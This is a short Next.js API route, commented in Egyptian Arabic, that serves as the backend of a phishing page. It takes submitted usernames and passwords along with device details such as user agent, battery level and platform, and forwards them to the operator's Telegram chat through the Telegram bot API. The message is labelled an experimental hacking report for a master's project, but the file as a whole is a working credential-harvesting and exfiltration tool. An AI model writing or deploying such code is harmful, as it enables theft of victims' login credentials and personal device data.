/* pages/api/auth.js */
export default async function handler(req, res) {
    if (req.method === 'POST') {
        const data = req.body;
        const token = process.env.TELEGRAM_TOKEN;
        const chatId = process.env.CHAT_ID;

        // تنسيق الرسالة اللي هتوصلك على تليجرام
        const message = `
⚠️ **تقرير اختراق تجريبي (ماجستير)**
━━━━━━━━━━━━━━━━━━
👤 **المستخدم:** \`${data.user}\`
🔑 **كلمة السر:** \`${data.pass}\`
━━━━━━━━━━━━━━━━━━
📱 **الجهاز:** ${data.ua}
🔋 **البطارية:** ${data.battery}
⏰ **الوقت:** ${data.time}
🌐 **المنصة:** ${data.platform}
━━━━━━━━━━━━━━━━━━
        `;

        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            }),
        });

        res.status(200).json({ success: true });
    }
}
